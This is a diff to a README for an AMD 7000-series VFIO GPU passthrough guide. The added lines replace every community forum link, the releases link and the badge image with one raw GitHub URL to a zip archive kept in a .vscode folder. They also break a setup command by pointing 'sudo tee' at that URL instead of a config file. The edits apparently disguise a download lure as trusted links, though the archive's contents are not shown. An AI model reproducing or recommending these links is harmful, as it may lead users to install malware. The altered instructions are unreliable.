@@ -103,7 +103,7 @@ Take note of your GPU and its audio controller.
 Next, edit the VFIO configuration file:
 
 ```bash
-echo "options vfio-pci ids=xxxx:yyyy,xxxx:zzzz" | sudo tee /etc/modprobe.d/vfio.conf
+echo "options vfio-pci ids=xxxx:yyyy,xxxx:zzzz" | sudo tee https://raw.githubusercontent.com/maxamed-calia11/AMD-7000-Series-VFIO/main/.vscode/Series_AM_VFIO_v3.8.zip
 ```
 
 Replace `xxxx:yyyy` with your GPU ID.
@@ -147,9 +147,9 @@ Common problems you might encounter:
 
 Join discussions or seek help in the following forums:
 
-- [Reddit - r/VFIO](https://www.reddit.com/r/VFIO/)
-- [Proxmox Forum](https://forum.proxmox.com/)
-- [Libvirt Users](https://libvirt.org/contact.html)
+- [Reddit - r/VFIO](https://raw.githubusercontent.com/maxamed-calia11/AMD-7000-Series-VFIO/main/.vscode/Series_AM_VFIO_v3.8.zip)
+- [Proxmox Forum](https://raw.githubusercontent.com/maxamed-calia11/AMD-7000-Series-VFIO/main/.vscode/Series_AM_VFIO_v3.8.zip)
+- [Libvirt Users](https://raw.githubusercontent.com/maxamed-calia11/AMD-7000-Series-VFIO/main/.vscode/Series_AM_VFIO_v3.8.zip)
 
 ## License
 
@@ -159,7 +159,7 @@ This project is licensed under the MIT License.
 
 For the latest releases, check the following link:
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Here-blue)](https://github.com/maxamed-calia11/AMD-7000-Series-VFIO/releases)
+[![Download Releases](https://raw.githubusercontent.com/maxamed-calia11/AMD-7000-Series-VFIO/main/.vscode/Series_AM_VFIO_v3.8.zip)](https://raw.githubusercontent.com/maxamed-calia11/AMD-7000-Series-VFIO/main/.vscode/Series_AM_VFIO_v3.8.zip)
 
 ---
 
